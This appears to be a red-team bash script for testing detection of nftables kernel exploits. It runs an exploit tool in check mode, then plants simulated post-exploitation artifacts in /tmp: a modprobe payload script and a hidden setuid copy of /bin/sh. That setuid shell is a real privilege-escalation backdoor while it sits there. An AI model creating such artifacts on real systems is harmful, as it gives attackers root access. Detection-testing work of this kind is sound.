#!/bin/bash
# Red team payload runner.
# Exercises nfttables in the ways that would be used during a real engagement.
# Uses check mode (non-destructive) since the host kernel may not be vulnerable.

REPORT_DIR="${1:-.}"
BINARY="/opt/nfttables/nfttables"

echo "[red] Starting payload execution"
echo "[red] Binary: $BINARY"
echo "[red] Kernel: $(uname -r)"

# Phase 1: Reconnaissance (info + scan)
echo ""
echo "[red] === Phase 1: Recon ==="
$BINARY info 2>&1 | tee "$REPORT_DIR/red_info.log"
$BINARY scan -v 2>&1 | tee "$REPORT_DIR/red_scan.log"

# Phase 2: Vulnerability check (creates nftables objects then cleans up)
echo ""
echo "[red] === Phase 2: Vulnerability Check ==="
$BINARY check auto 2>&1 | tee "$REPORT_DIR/red_check.log"

# Phase 3: Attempt exploitation (will likely fail on patched kernel,
# but the observable syscall patterns are what we're testing detection of)
echo ""
echo "[red] === Phase 3: Exploit Attempt ==="
# Run in check mode to generate the telemetry without actual exploitation
$BINARY check 1086 2>&1 | tee "$REPORT_DIR/red_1086.log"
sleep 1
$BINARY check 32233 2>&1 | tee "$REPORT_DIR/red_32233.log"

# Phase 4: Simulate post-exploitation artifacts
# (create the files that a successful exploit would create, for blue team to detect)
echo ""
echo "[red] === Phase 4: Simulated Artifacts ==="

# Simulate modprobe payload script
cat > /tmp/.nft_mint << 'PAYLOAD'
#!/bin/sh
cp /bin/sh /tmp/.nft_sh
chmod u+s /tmp/.nft_sh
PAYLOAD
chmod +x /tmp/.nft_mint
echo "[red] Created /tmp/.nft_mint"

# Simulate trigger binary (non-ELF executable with weird magic)
printf '\xde\xad\xbe\xef' > /tmp/.nft_trigger
chmod +x /tmp/.nft_trigger
echo "[red] Created /tmp/.nft_trigger"

# Simulate SUID shell (copy a real binary and set SUID for detection testing)
cp /bin/sh /tmp/.nft_sh
chmod u+s /tmp/.nft_sh
echo "[red] Created /tmp/.nft_sh (SUID)"

# Let the artifacts sit for blue team to detect
sleep 3

# Phase 5: Cleanup (test rugpull)
echo ""
echo "[red] === Phase 5: Cleanup ==="
$BINARY rugpull 2>&1 | tee "$REPORT_DIR/red_rugpull.log"

echo ""
echo "[red] Payload execution complete"
